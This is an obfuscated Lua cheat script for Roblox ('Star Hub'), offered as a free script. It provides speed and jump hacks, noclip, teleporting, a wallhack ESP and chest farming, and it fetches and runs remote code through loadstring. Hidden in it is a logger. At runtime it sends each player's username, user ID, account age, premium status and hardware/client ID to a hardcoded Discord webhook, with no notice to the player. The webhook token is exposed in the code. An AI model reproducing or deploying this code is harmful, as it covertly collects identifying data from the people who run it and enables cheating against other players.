-- stop sneaking in my links trynna steal my code, i literally dont care bro its a free script,

local webhookcheck=(is_sirhurt_closure and "sirhurt") or (pebc_execute and "protosmasher") or (syn and "Synapse X") or (secure_load and "sentinel") or (KRNL_LOADED and "krnl") or (SONA_LOADED and "sona") or (isvm and "proxo") or (shadow_env and "shadow") or (jit and "easyexploits") or (WrapGlobal and "WeAreDevs") or (getscriptenvs and "calamari") or (OXYGEN_LOADED and "oxygen u") or (IsElectron and "electron") or "undetected probably a shit executor";if (getexecutorname and (type(getexecutorname)=="function")) then webhookcheck="scriptware";end local Plr=game.Players.LocalPlayer;local plr=Plr;local Player=Plr;local player=Plr;local Character=Plr.Character or Plr.CharacterAdded;local LP=game.Players.LocalPlayer;local char=LP.Character;local hum=char.Humanoid;local vu=game:GetService("VirtualUser");game:GetService("Players").LocalPlayer.Idled:connect(function()local FlatIdent_45AE7=0;while true do if (FlatIdent_45AE7==0) then vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame);wait(1);FlatIdent_45AE7=1;end if (FlatIdent_45AE7==1) then vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame);break;end end end);if (getexecutorname and (type(getexecutorname)=="function")) then webhookcheck="scriptware";end local function getTime()local FlatIdent_3BFCB=0;local date;while true do if (0==FlatIdent_3BFCB) then date=os.date("!t");return ("%02d:%02d %s"):format((((date.hour%24) -1)%12) + 1,date.min,((date.hour>11) and "PM") or "AM");end end end local getmsg=game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering");local Players=game:GetService("Players");local player=Players.LocalPlayer;local saymsg=game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest");repeat wait();until game:IsLoaded()local conn=getmsg.OnClientEvent:Connect(function(packet,channel)local FlatIdent_810DF=0;while true do if (2==FlatIdent_810DF) then print(""   .. _G.userName   .. ": "   .. _G.message);break;end if (FlatIdent_810DF==0) then userID=tostring(packet.SpeakerUserId);_G.userName=Players:GetNameFromUserIdAsync(packet.SpeakerUserId);FlatIdent_810DF=1;end if (FlatIdent_810DF==1) then Display=tostring(packet.SpeakerUserDisplayName);_G.message=packet.Message;FlatIdent_810DF=2;end end end);local plr=game.Players.LocalPlayer;local Workspace=game:GetService("Workspace");local UserInputService=game:GetService("UserInputService");local RS=game:GetService("RunService");local Mouse=plr:GetMouse();local CurrentCamera=Workspace.CurrentCamera;local player=game.Players.LocalPlayer;local character=player.Character or player.CharacterAdded:Wait();local GameName=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name;local Thing=game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true",game.Players.LocalPlayer.UserId));Thing=game:GetService("HttpService"):JSONDecode(Thing).data[1];local AvatarImage=Thing.imageUrl;local HWID=game:GetService("RbxAnalyticsService"):GetClientId();local premium="N/A";local alt="N/A";if (player.MembershipType==Enum.MembershipType.Premium) then premium="true";else premium="false";end if ( not premium and (player.AccountAge>=90)) then alt="Possibly";elseif ( not premium and (player.AccountAge>=180)) then alt="Unlikely";elseif ( not premium and (player.AccountAge>=1500)) then alt="No";elseif (premium and (player.AccountAge>=90)) then alt="No";end local url="https://discord.com/api/webhooks/1018246201163919451/FPqfBHb5kvuPx7hJw76AelYIMcxQw4gx66ykW5AqNtpCOD0RGS-fxYSwTPnRVHm-14Y2";local data={embeds={{title="**[Star Hub] Execution Detected**",url="https://www.roblox.com/users/"   .. plr.UserId   .. "/profile",description="**Username**: `"   .. plr.Name   .. "`",thumbnail={url=AvatarImage},type="rich",color=tonumber(3553599),fields={{name="Exploit",value="`"   .. webhookcheck   .. "`",inline=true},{name="Game",value="`"   .. GameName   .. "`",inline=true},{name="User Id",value="`"   .. plr.UserId   .. "`",inline=true},{name="Display Name",value="`"   .. plr.DisplayName   .. "`",inline=true},{name="Alt",value="`"   .. alt   .. "`",inline=true},{name="Account Age",value="`"   .. player.AccountAge   .. " Days`",inline=true},{name="Is Premium",value="`"   .. premium   .. "`",inline=true},{name="HWID",value="```"   .. HWID   .. "```",inline=true}},timestamp=DateTime.now():ToIsoDate()}}};local newdata=game:GetService("HttpService"):JSONEncode(data);local headers={content-type="application/json"};request=http_request or request or HttpPost or request or syn.request;local abcdef={Url=url,Body=newdata,Method="POST",Headers=headers};request(abcdef);local player=game.Players.LocalPlayer;local char=player.Character;local hum=char.Humanoid;local HRP=char.HumanoidRootPart;local mouse=player:GetMouse();local Runserv=game:GetService("RunService");local Hub=loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Rayfield/main/source"))();print(webhookcheck);if (webhookcheck~="Synapse X") then player:Kick("Executor not supported. Only Synapse X is supported, And you're using "   .. webhookcheck);elseif (webhookcheck=="Synapse X") then Hub:Notify({Title="Supported",Content="Executor Supported ("   .. webhookcheck   .. ")",Duration=3,Image=9754130783});end local version="v1.0.0.1";local ui=Hub:CreateWindow({Name="Star Hub",LoadingTitle="Star Hub Loader",LoadingSubtitle="Version: "   .. version,ConfigurationSaving={Enabled=false,FolderName=nil,FileName="Big Hub"},Discord={Enabled=true,Invite="hDH7ma89FC",RememberJoins=true},KeySystem=true,KeySettings={Title="Star Hub",Subtitle="Key System",Note="Join the discord (.gg/hDH7ma89FC)",FileName="StarHubKey",SaveKey=false,GrabKeyFromSite=false,Key="sexy"}});local cheats=ui:CreateTab("Cheats");local playercheats=cheats:CreateSection("Local Player");Hub:Notify({Title="Loaded",Content="Successfully loaded Star Hub "   .. version   .. ", Enjoy!",Duration=4,Image=9754130783});cheats:CreateSlider({Name="Walkspeed",Range={16,1000},Increment=2,Suffix="Walkspeed",CurrentValue=16,Flag="WSslider",Callback=function(Value)game:GetService("RunService").RenderStepped:Connect(function()hum.WalkSpeed=Value;end);end});cheats:CreateSlider({Name="Jumppower",Range={50,2000},Increment=2,Suffix="Jumppower",CurrentValue=16,Flag="JPslider",Callback=function(Value)game:GetService("RunService").RenderStepped:Connect(function()hum.JumpPower=Value;end);end});function GetPlayer(shortcut)local FlatIdent_893C2=0;local player;local g;while true do if (FlatIdent_893C2==1) then for i=1, #g do if (string.lower(string.sub(g[i].Name,1,string.len(shortcut)))==string.lower(shortcut)) then player=g[i];break;end end return player;end if (FlatIdent_893C2==0) then player=nil;g=game.Players:GetPlayers();FlatIdent_893C2=1;end end end cheats:CreateInput({Name="Teleport to Player",PlaceholderText="Player Name",RemoveTextAfterFocusLost=true,Callback=function(Text)local FlatIdent_3AA43=0;local Target;while true do if (FlatIdent_3AA43==0) then Target=GetPlayer(Text);print(Target.Name);FlatIdent_3AA43=1;end if (FlatIdent_3AA43==1) then HRP.CFrame=CFrame.new(Target.Character.HumanoidRootPart.Position);break;end end end});cheats:CreateToggle({Name="Noclip",CurrentValue=false,Flag="NoclipTog1",Callback=function(Value)local FlatIdent_5B884=0;local NoClipLoop;while true do if (FlatIdent_5B884==0) then NoClipLoop=nil;function NoClipLoop()for _,child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do if (child:IsA("BasePart") and (child.CanCollide==true)) then child.CanCollide=false;end end end FlatIdent_5B884=1;end if (FlatIdent_5B884==1) then if (Value==true) then local FlatIdent_119AD=0;while true do if (FlatIdent_119AD==0) then _G.Noclipping=game:GetService("RunService").Stepped:Connect(NoClipLoop);print("Noclipping!");break;end end elseif (Value==false) then _G.Noclipping:Disconnect();end break;end end end});local gamecheats=cheats:CreateSection("Game Cheats");cheats:CreateButton({Name="Execute Autoclicker",Callback=function()loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/JustEzpi/ROBLOX-Scripts/main/ROBLOX_AutoClicker"))();end});local Visuals=ui:CreateTab("Visuals");local VSection=Visuals:CreateSection("ESP");local plrs=game['Players'];local rs=game['RunService'];local Players=game:GetService("Players");local ReplicatedStorage=game:GetService("ReplicatedStorage");local UserInputService=game:GetService("UserInputService");local Lighting=game:GetService("Lighting");local Teams=game:GetService("Teams");local RunService=game:GetService("RunService");local TeleportService=game:GetService("TeleportService");local LocalPlayer=Players.LocalPlayer;local Mouse=LocalPlayer:GetMouse();local CurrentCamera=workspace.CurrentCamera;local plr=plrs.LocalPlayer;local mouse=plr:GetMouse();local camera=workspace.CurrentCamera;local worldToViewportPoint=camera.worldToViewportPoint;local cc=Instance.new("ColorCorrectionEffect",game.Lighting);local blur=Instance.new("BlurEffect",game.Lighting);local sun=Instance.new("SunRaysEffect",game.Lighting);blur.Size=0;sun.Intensity=0;local Drawingnew=Drawing.new;local Color3fromRGB=Color3.fromRGB;local Vector3new=Vector3.new;local Vector2new=Vector2.new;local mathfloor=math.floor;local mathceil=math.ceil;local esp={players={},enabled=false,teamcheck=true,fontsize=16,font=0,settings={name={enabled=true,outline=true,color=Color3fromRGB(255,255,255),outlineColor=Color3fromRGB(94,0,255)},box={enabled=true,outline=true,color=Color3fromRGB(131,105,165),outlineColor=Color3fromRGB(0,0,0)},healthbar={enabled=true,outline=true,color=Color3fromRGB(111,0,255),outlineColor=Color3fromRGB(0,0,0)},healthtext={enabled=true,outline=true,color=Color3fromRGB(255,255,255),outlineColor=Color3fromRGB(94,0,255)},distance={enabled=true,outline=true,color=Color3fromRGB(255,255,255),outlineColor=Color3fromRGB(94,0,255)}}};esp.NewDrawing=function(type,properties)local FlatIdent_33267=0;local newDrawing;while true do if (FlatIdent_33267==1) then return newDrawing;end if (0==FlatIdent_33267) then newDrawing=Drawingnew(type);for i,v in next,properties or {} do newDrawing[i]=v;end FlatIdent_33267=1;end end end;esp.NewPlayer=function(v)esp.players[v]={name=esp.NewDrawing("Text",{Color=Color3fromRGB(94,0,255),Outline=true,Center=true,Size=13,Font=0}),boxOutline=esp.NewDrawing("Square",{Color=Color3fromRGB(0,0,0),Thickness=3}),box=esp.NewDrawing("Square",{Color=Color3fromRGB(108,11,204),Thickness=1}),healthBarOutline=esp.NewDrawing("Line",{Color=Color3fromRGB(0,0,0),Thickness=3}),healthBar=esp.NewDrawing("Line",{Color=Color3fromRGB(255,255,255),Thickness=1}),healthText=esp.NewDrawing("Text",{Color=Color3fromRGB(94,0,255),Outline=true,Center=true,Size=13,Font=0}),distance=esp.NewDrawing("Text",{Color=Color3fromRGB(94,0,255),Outline=true,Center=true,Size=13,Font=0})};end;for _,v in ipairs(plrs:GetPlayers()) do esp.NewPlayer(v);end plrs.PlayerAdded:Connect(function(v)esp.NewPlayer(v);end);plrs.PlayerRemoving:Connect(function(v)local FlatIdent_82088=0;while true do if (FlatIdent_82088==0) then for i,v in pairs(esp.players[v]) do v:Remove();end esp.players[v]=nil;break;end end end);local mainLoop=rs.RenderStepped:Connect(function()for i,v in pairs(esp.players) do if ((i~=plr) and i.Character and i.Character:FindFirstChild("Humanoid") and i.Character:FindFirstChild("HumanoidRootPart") and i.Character:FindFirstChild("Head")) then local FlatIdent_13EFF=0;local hum;local hrp;local head;local Vector;local onScreen;local Size;local BoxSize;local BoxPos;local BottomOffset;while true do if (FlatIdent_13EFF==2) then Size=(camera:WorldToViewportPoint(hrp.Position-Vector3new(0,3,0)).Y-camera:WorldToViewportPoint(hrp.Position + Vector3new(0,2.6,0)).Y)/2;BoxSize=Vector2new(mathfloor(Size * 1.5),mathfloor(Size * 1.9));FlatIdent_13EFF=3;end if (FlatIdent_13EFF==0) then hum=i.Character.Humanoid;hrp=i.Character.HumanoidRootPart;FlatIdent_13EFF=1;end if (FlatIdent_13EFF==4) then if (onScreen and esp.enabled) then local FlatIdent_7BE57=0;while true do if (FlatIdent_7BE57==2) then if esp.settings.healthtext.enabled then local FlatIdent_44025=0;while true do if (FlatIdent_44025==1) then v.healthText.Color=esp.settings.healthtext.color;v.healthText.OutlineColor=esp.settings.healthtext.outlineColor;FlatIdent_44025=2;end if (2==FlatIdent_44025) then v.healthText.Outline=esp.settings.healthtext.outline;v.healthText.Font=esp.font;FlatIdent_44025=3;end if (FlatIdent_44025==0) then v.healthText.Text=tostring(mathfloor(((hum.Health/hum.MaxHealth) * 100) + 0.5));v.healthText.Position=Vector2new(BoxPos.X-20,((BoxPos.Y + BoxSize.Y) -(1 * BoxSize.Y)) -1);FlatIdent_44025=1;end if (FlatIdent_44025==3) then v.healthText.Size=esp.fontsize;v.healthText.Visible=true;break;end end else v.healthText.Visible=false;end if esp.teamcheck then if (v.TeamColor~=plr.TeamColor) then local FlatIdent_216B5=0;while true do if (FlatIdent_216B5==2) then v.distance.Visible=esp.settings.distance.enabled;break;end if (0==FlatIdent_216B5) then v.name.Visible=esp.settings.name.enabled;v.box.Visible=esp.settings.box.enabled;FlatIdent_216B5=1;end if (FlatIdent_216B5==1) then v.healthBar.Visible=esp.settings.healthbar.enabled;v.healthText.Visible=esp.settings.healthtext.enabled;FlatIdent_216B5=2;end end else local FlatIdent_4F9E1=0;while true do if (0==FlatIdent_4F9E1) then v.name.Visible=false;v.boxOutline.Visible=false;FlatIdent_4F9E1=1;end if (FlatIdent_4F9E1==1) then v.box.Visible=false;v.healthBarOutline.Visible=false;FlatIdent_4F9E1=2;end if (FlatIdent_4F9E1==3) then v.distance.Visible=false;break;end if (FlatIdent_4F9E1==2) then v.healthBar.Visible=false;v.healthText.Visible=false;FlatIdent_4F9E1=3;end end end end break;end if (FlatIdent_7BE57==1) then if esp.settings.box.enabled then local FlatIdent_23723=0;while true do if (FlatIdent_23723==1) then v.boxOutline.Visible=esp.settings.box.outline;v.boxOutline.Color=esp.settings.box.outlineColor;FlatIdent_23723=2;end if (FlatIdent_23723==3) then v.box.Color=esp.settings.box.color;v.box.Visible=true;break;end if (FlatIdent_23723==0) then v.boxOutline.Size=BoxSize;v.boxOutline.Position=BoxPos;FlatIdent_23723=1;end if (FlatIdent_23723==2) then v.box.Size=BoxSize;v.box.Position=BoxPos;FlatIdent_23723=3;end end else local FlatIdent_5ED74=0;while true do if (FlatIdent_5ED74==0) then v.boxOutline.Visible=false;v.box.Visible=false;break;end end end if esp.settings.healthbar.enabled then local FlatIdent_7CF59=0;while true do if (FlatIdent_7CF59==1) then v.healthBar.Color=esp.settings.healthbar.color;v.healthBar.Visible=true;FlatIdent_7CF59=2;end if (FlatIdent_7CF59==0) then v.healthBar.From=Vector2new(BoxPos.X-5,BoxPos.Y + BoxSize.Y);v.healthBar.To=Vector2new(v.healthBar.From.X,v.healthBar.From.Y-((hum.Health/hum.MaxHealth) * BoxSize.Y));FlatIdent_7CF59=1;end if (FlatIdent_7CF59==2) then v.healthBarOutline.From=Vector2new(v.healthBar.From.X,BoxPos.Y + BoxSize.Y + 1);v.healthBarOutline.To=Vector2new(v.healthBar.From.X,(v.healthBar.From.Y-(1 * BoxSize.Y)) -1);FlatIdent_7CF59=3;end if (3==FlatIdent_7CF59) then v.healthBarOutline.Color=esp.settings.healthbar.outlineColor;v.healthBarOutline.Visible=esp.settings.healthbar.outline;break;end end else local FlatIdent_5845E=0;while true do if (FlatIdent_5845E==0) then v.healthBarOutline.Visible=false;v.healthBar.Visible=false;break;end end end FlatIdent_7BE57=2;end if (FlatIdent_7BE57==0) then if esp.settings.name.enabled then local FlatIdent_24128=0;while true do if (FlatIdent_24128==2) then v.name.OutlineColor=esp.settings.name.outlineColor;v.name.Font=esp.font;FlatIdent_24128=3;end if (FlatIdent_24128==3) then v.name.Size=esp.fontsize;v.name.Visible=true;break;end if (1==FlatIdent_24128) then v.name.Text=tostring(i);v.name.Color=esp.settings.name.color;FlatIdent_24128=2;end if (FlatIdent_24128==0) then v.name.Position=Vector2new((BoxSize.X/2) + BoxPos.X,BoxPos.Y-16);v.name.Outline=esp.settings.name.outline;FlatIdent_24128=1;end end else v.name.Visible=false;end if (esp.settings.distance.enabled and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")) then local FlatIdent_438E7=0;while true do if (FlatIdent_438E7==1) then v.distance.Text="["   .. mathfloor((hrp.Position-plr.Character.HumanoidRootPart.Position).Magnitude)   .. "m]";v.distance.Color=esp.settings.distance.color;FlatIdent_438E7=2;end if (FlatIdent_438E7==2) then v.distance.OutlineColor=esp.settings.distance.outlineColor;BottomOffset=BottomOffset + 15;FlatIdent_438E7=3;end if (FlatIdent_438E7==0) then v.distance.Position=Vector2new((BoxSize.X/2) + BoxPos.X,BottomOffset);v.distance.Outline=esp.settings.distance.outline;FlatIdent_438E7=1;end if (FlatIdent_438E7==3) then v.distance.Font=esp.font;v.distance.Size=esp.fontsize;FlatIdent_438E7=4;end if (FlatIdent_438E7==4) then v.distance.Visible=true;break;end end else v.distance.Visible=false;end FlatIdent_7BE57=1;end end else local FlatIdent_314FA=0;while true do if (FlatIdent_314FA==2) then v.healthBar.Visible=false;v.healthText.Visible=false;FlatIdent_314FA=3;end if (FlatIdent_314FA==1) then v.box.Visible=false;v.healthBarOutline.Visible=false;FlatIdent_314FA=2;end if (3==FlatIdent_314FA) then v.distance.Visible=false;break;end if (FlatIdent_314FA==0) then v.name.Visible=false;v.boxOutline.Visible=false;FlatIdent_314FA=1;end end end break;end if (FlatIdent_13EFF==1) then head=i.Character.Head;Vector,onScreen=camera:WorldToViewportPoint(i.Character.HumanoidRootPart.Position);FlatIdent_13EFF=2;end if (FlatIdent_13EFF==3) then BoxPos=Vector2new(mathfloor(Vector.X-((Size * 1.5)/2)),mathfloor(Vector.Y-((Size * 1.6)/2)));BottomOffset=BoxSize.Y + BoxPos.Y + 1;FlatIdent_13EFF=4;end end else local FlatIdent_9923C=0;while true do if (FlatIdent_9923C==3) then v.distance.Visible=false;break;end if (FlatIdent_9923C==2) then v.healthBar.Visible=false;v.healthText.Visible=false;FlatIdent_9923C=3;end if (FlatIdent_9923C==0) then v.name.Visible=false;v.boxOutline.Visible=false;FlatIdent_9923C=1;end if (FlatIdent_9923C==1) then v.box.Visible=false;v.healthBarOutline.Visible=false;FlatIdent_9923C=2;end end end end end);getgenv().esp=esp;local EspTog=Visuals:CreateToggle({Name="ESP",CurrentValue=false,Flag="EspTog",Callback=function(tog)if (tog==true) then getgenv().esp.enabled=true;elseif (tog==false) then getgenv().esp.enabled=false;end end});local Teleports=ui:CreateTab("Teleports");local TSection=Teleports:CreateSection("Teleports");local chests=game:GetService("Workspace").Live.Chests;Teleports:CreateButton({Name="Get Chests",Callback=function()while true do local FlatIdent_8CC9=0;while true do if (0==FlatIdent_8CC9) then for _,npc in next,chests:GetChildren() do local FlatIdent_86E4B=0;while true do if (FlatIdent_86E4B==0) then print("Current Chest: "   .. npc.Name);HRP.CFrame=CFrame.new(npc.Touch.Position);FlatIdent_86E4B=1;end if (FlatIdent_86E4B==1) then task.wait(1.5);break;end end end task.cancel();FlatIdent_8CC9=1;end if (FlatIdent_8CC9==1) then task.wait();break;end end end end});local Games=ui:CreateTab("Supported");local GSection=Games:CreateSection("Supported Games");Games:CreateParagraph({Title="Currently Supported Games",Content=""});local Settings=ui:CreateTab("Settings");local SetSection=Settings:CreateSection("Settings");Settings:CreateButton({Name="Boost FPS",Callback=function()local FlatIdent_799F8=0;while true do if (FlatIdent_799F8==0) then for _,v in pairs(workspace:GetDescendants()) do if ((v.ClassName=="Part") or (v.ClassName=="SpawnLocation") or (v.ClassName=="WedgePart") or (v.ClassName=="Terrain") or (v.ClassName=="MeshPart")) then v.Material="Plastic";end end Hub:Notify({Title="Success",Content="Successfully Boosted FPS!",Duration=3,Image=9754130783});break;end end end});Settings:CreateButton({Name="Destroy UI",Callback=function()Hub:Destroy();end});local PanicBind=Settings:CreateKeybind({Name="Panic Mode",CurrentKeybind="LeftAlt",HoldToInteract=false,Flag="PanicBind",Callback=function(Keybind)Hub:Destroy();end});Settings:CreateButton({Name="Rejoin Server",Callback=function()game:GetService("'TeleportService'"):TeleportToPlaceInstance(game.PlaceId,game.JobId,game:GetService("'Players'").LocalPlayer);end});